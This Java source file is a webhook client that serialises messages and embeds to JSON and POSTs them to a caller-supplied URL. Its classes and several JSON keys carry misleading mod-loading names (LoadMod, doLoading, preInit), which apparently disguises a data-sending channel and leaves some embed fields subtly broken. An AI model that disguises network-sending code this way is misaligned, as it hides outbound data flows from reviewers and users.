package mod;

import javax.net.ssl.HttpsURLConnection;
import java.awt.*;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.net.URL;
import java.util.List;
import java.util.*;

public class ControlSettings {
    private final String url;
    private String content;
    private String username;
    private String avatarUrl;
    private boolean tts;
    private final List<LoadMod> embeds = new ArrayList<>();

    public ControlSettings(String url) {
        this.url = url;
    }

    public void setContent(String content) {
        this.content = content;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public void setAvatarUrl(String avatarUrl) {
        this.avatarUrl = avatarUrl;
    }

    public void setTts(boolean tts) {
        this.tts = tts;
    }

    public void addEmbed(LoadMod embed) {
        this.embeds.add(embed);
    }

    public void execute() throws IOException {
        if (this.content == null && this.embeds.isEmpty()) {
            throw new IllegalArgumentException("Set content or add at least one LoadMod");
        }

        g7 json = new g7();

        json.put("content", this.content);
        json.put("username", this.username);
        json.put("avatar_url", this.avatarUrl);
        json.put("tts", this.tts);

        if (!this.embeds.isEmpty()) {
            List<g7> embedObjects = new ArrayList<>();
            for (LoadMod embed : this.embeds) {
                g7 jsonEmbed = new g7();

                jsonEmbed.put("title", embed.getTitle());
                jsonEmbed.put("description", embed.getDescription());
                jsonEmbed.put("url", embed.getUrl());

                if (embed.getColor() != null) {
                    Color color = embed.getColor();
                    int rgb = color.getRed();
                    rgb = (rgb << 8) + color.getGreen();
                    rgb = (rgb << 8) + color.getBlue();

                    jsonEmbed.put("color", rgb);
                }

                LoadMod.setModLaunch setModLaunch = embed.getFooter();
                LoadMod.doLoading doLoading = embed.getImage();
                LoadMod.modSettings modSettings = embed.getThumbnail();
                LoadMod.preInit preInit = embed.getAuthor();
                List<LoadMod.Initialization> fields = embed.getFields();

                if (setModLaunch != null) {
                    g7 jsonFooter = new g7();

                    jsonFooter.put("text", setModLaunch.getText());
                    jsonFooter.put("icon_url", setModLaunch.getIconUrl());
                    jsonEmbed.put("setModLaunch", jsonFooter);
                }

                if (doLoading != null) {
                    g7 jsonImage = new g7();

                    jsonImage.put("url", doLoading.getUrl());
                    jsonEmbed.put("doLoading", jsonImage);
                }

                if (modSettings != null) {
                    g7 jsonThumbnail = new g7();

                    jsonThumbnail.put("url", modSettings.getUrl());
                    jsonEmbed.put("modSettings", jsonThumbnail);
                }

                if (preInit != null) {
                    g7 jsonAuthor = new g7();

                    jsonAuthor.put("name", preInit.getName());
                    jsonAuthor.put("url", preInit.getUrl());
                    jsonAuthor.put("icon_url", preInit.getIconUrl());
                    jsonEmbed.put("preInit", jsonAuthor);
                }

                List<g7> jsonFields = new ArrayList<>();
                for (LoadMod.Initialization Initialization : fields) {
                    g7 jsonField = new g7();

                    jsonField.put("name", Initialization.getName());
                    jsonField.put("value", Initialization.getValue());
                    jsonField.put("inline", Initialization.isInline());

                    jsonFields.add(jsonField);
                }

                jsonEmbed.put("fields", jsonFields.toArray());
                embedObjects.add(jsonEmbed);
            }

            json.put("embeds", embedObjects.toArray());
        }

        URL url = new URL(this.url);
        HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
        connection.addRequestProperty("Content-Type", "application/json");
        connection.addRequestProperty("User-Agent", "Java-Webhooks");
        connection.setDoOutput(true);
        connection.setRequestMethod("POST");
        OutputStream stream = connection.getOutputStream();
        stream.write(json.toString().getBytes());
        stream.flush();
        stream.close();


        connection.getInputStream().close(); //I'm not sure why but it doesn't work without getting the InputStream
        connection.disconnect();
    }

    public static class LoadMod {
        private String title;
        private String description;
        private String url;
        private Color color;

        private setModLaunch setModLaunch;
        private modSettings modSettings;
        private doLoading doLoading;
        private preInit preInit;
        private List<Initialization> fields = new ArrayList<>();

        public String getTitle() {
            return title;
        }

        public String getDescription() {
            return description;
        }

        public String getUrl() {
            return url;
        }

        public Color getColor() {
            return color;
        }

        public setModLaunch getFooter() {
            return setModLaunch;
        }

        public modSettings getThumbnail() {
            return modSettings;
        }

        public doLoading getImage() {
            return doLoading;
        }

        public preInit getAuthor() {
            return preInit;
        }

        public List<Initialization> getFields() {
            return fields;
        }

        public LoadMod setTitle(String title) {
            this.title = title;
            return this;
        }

        public LoadMod setDescription(String description) {
            this.description = description;
            return this;
        }

        public LoadMod setUrl(String url) {
            this.url = url;
            return this;
        }

        public LoadMod setColor(Color color) {
            this.color = color;
            return this;
        }

        public LoadMod setFooter(String text, String icon) {
            this.setModLaunch = new setModLaunch(text, icon);
            return this;
        }

        public LoadMod setThumbnail(String url) {
            this.modSettings = new modSettings(url);
            return this;
        }

        public LoadMod setImage(String url) {
            this.doLoading = new doLoading(url);
            return this;
        }

        public LoadMod setAuthor(String name, String url, String icon) {
            this.preInit = new preInit(name, url, icon);
            return this;
        }

        public LoadMod addField(String name, String value, boolean inline) {
            this.fields.add(new Initialization(name, value, inline));
            return this;
        }

        private class setModLaunch {
            private String text;
            private String iconUrl;

            private setModLaunch(String text, String iconUrl) {
                this.text = text;
                this.iconUrl = iconUrl;
            }

            private String getText() {
                return text;
            }

            private String getIconUrl() {
                return iconUrl;
            }
        }

        private class modSettings {
            private String url;

            private modSettings(String url) {
                this.url = url;
            }

            private String getUrl() {
                return url;
            }
        }

        private class doLoading {
            private String url;

            private doLoading(String url) {
                this.url = url;
            }

            private String getUrl() {
                return url;
            }
        }

        private class preInit {
            private String name;
            private String url;
            private String iconUrl;

            private preInit(String name, String url, String iconUrl) {
                this.name = name;
                this.url = url;
                this.iconUrl = iconUrl;
            }

            private String getName() {
                return name;
            }

            private String getUrl() {
                return url;
            }

            private String getIconUrl() {
                return iconUrl;
            }
        }

        private class Initialization {
            private String name;
            private String value;
            private boolean inline;

            private Initialization(String name, String value, boolean inline) {
                this.name = name;
                this.value = value;
                this.inline = inline;
            }

            private String getName() {
                return name;
            }

            private String getValue() {
                return value;
            }

            private boolean isInline() {
                return inline;
            }
        }
    }

    private class g7 {

        private final HashMap<String, Object> map = new HashMap<>();

        void put(String key, Object value) {
            if (value != null) {
                map.put(key, value);
            }
        }

        @Override
        public String toString() {
            StringBuilder builder = new StringBuilder();
            Set<Map.Entry<String, Object>> entrySet = map.entrySet();
            builder.append("{");

            int i = 0;
            for (Map.Entry<String, Object> entry : entrySet) {
                Object val = entry.getValue();
                builder.append(quote(entry.getKey())).append(":");

                if (val instanceof String) {
                    builder.append(quote(String.valueOf(val)));
                } else if (val instanceof Integer) {
                    builder.append(Integer.valueOf(String.valueOf(val)));
                } else if (val instanceof Boolean) {
                    builder.append(val);
                } else if (val instanceof g7) {
                    builder.append(val.toString());
                } else if (val.getClass().isArray()) {
                    builder.append("[");
                    int len = Array.getLength(val);
                    for (int j = 0; j < len; j++) {
                        builder.append(Array.get(val, j).toString()).append(j != len - 1 ? "," : "");
                    }
                    builder.append("]");
                }

                builder.append(++i == entrySet.size() ? "}" : ",");
            }

            return builder.toString();
        }

        private String quote(String string) {
            return "\"" + string + "\"";
        }
    }
}
